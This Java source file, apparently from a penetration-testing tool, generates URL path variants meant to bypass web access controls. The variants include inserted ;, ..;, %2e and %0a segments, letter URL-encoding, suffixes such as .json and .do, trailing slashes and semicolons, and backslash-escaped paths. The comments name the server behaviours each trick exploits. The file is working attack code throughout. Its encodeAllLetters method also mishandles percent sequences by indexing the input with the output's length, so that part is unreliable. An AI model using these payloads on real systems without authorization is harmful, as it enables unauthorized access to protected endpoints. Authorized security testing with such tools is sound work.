package org.m2sec.modules.bypass;

import org.m2sec.common.utils.HttpUtil;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

/**
 * @author: outlaws-bai
 * @date: 2024/6/21 20:23
 * @description:
 */
public class BypassTools {
    public static Set<String> generateBypassPathPayloads(String path) {
        Set<String> payloads = new HashSet<>();
        if (path.isEmpty()) return payloads;
        String[] pathParts = path.split("/");
        if (pathParts.length == 0) return payloads;
        // 正常化处理下path
        path = HttpUtil.normalizePath(path);

        // 1. 在请求的每个/中间插入干扰字符，一般为getRequestUri引起.
        // 假设原始请求路径为/api/test，绕过字符为;，经过处理后应该生成如下路径/;/api/;/test
        for (String bypassString : bypassPathStep1StringArray) {
            for (int i = 0; i < path.length()-1; i++) {
                if (path.charAt(i) == '/') {
                    String replaced = path.substring(0, i) + bypassString + path.substring(i + 1);
                    payloads.add(replaced);
                }
            }
        }
        // 2. URL编码请求路径，一般为getRequestUri引起,假设原始请求路径为/api/test，经过处理后应该生成如下路径,/%61%70%69/%74%65%73%74
        payloads.add(encodeAllLetters(path));
        // 3. 末尾添加.xxx的形式来绕过，一般为setUseSuffixPatternMatch引起,
        // 假设原始请求路径为/api/test，经过处理后应该生成如下路径/api/test.xxx
        if (!path.endsWith(".") && !path.endsWith("/")) {
            payloads.add(path + ".json");
            payloads.add(path + ".action");
            payloads.add(path + ".do");
        }
        // 4.
        // 末尾添加干扰字符的形式来绕过，一般为nginx配置了location=xxx这样的黑名单引起的,假设原始请求路径为/api/test，绕过字符为;，经过处理后应该生成如下路径/api/test;
        if (!path.endsWith("/")){
            payloads.add(path + "/");
            payloads.add(path + "//");
            payloads.add(path + "/.");
            payloads.add(path + "/..");
            payloads.add(path + ";");
        }else{
            payloads.add(path.substring(0,path.length()-1) + ";/");
        }
        // 5. 转换大小写
//        payloads.add(path.toUpperCase());
        // 6. 反斜
        payloads.add(path.replace("/", "\\/"));
        // 7. add more. 可参考文章: https://tttang.com/archive/1899/
        return payloads;
    }

    /**
     * URL编码input中所有的字母
     *
     * @param input ...
     * @return ...
     */
    public static String encodeAllLetters(String input) {
        StringBuilder result = new StringBuilder();

        for (char c : input.toCharArray()) {
            if (Character.isLetter(c)) {
                // 如果是字母，则进行URL编码
                String encoded = "%" + Integer.toHexString(c).toUpperCase();
                result.append(encoded);
            } else if (c == '%') {
                // 如果是%，直接将%及其后两个字符添加到结果中
                result.append(c);
                if (input.length() >= result.length() + 2) {
                    result.append(input, result.length(), result.length() + 2);
                }
            } else {
                // 如果是其他字符，直接添加到结果中
                result.append(c);
            }
        }

        return result.toString();
    }

    private static final String[] bypassPathStep1StringArray = new String[]{"/./", "/;/", "/.;/",
        "//", "/health/..;/", "/%2e/", "/%0a/", "/health/%2e%2e;/", "/%20/"};

}
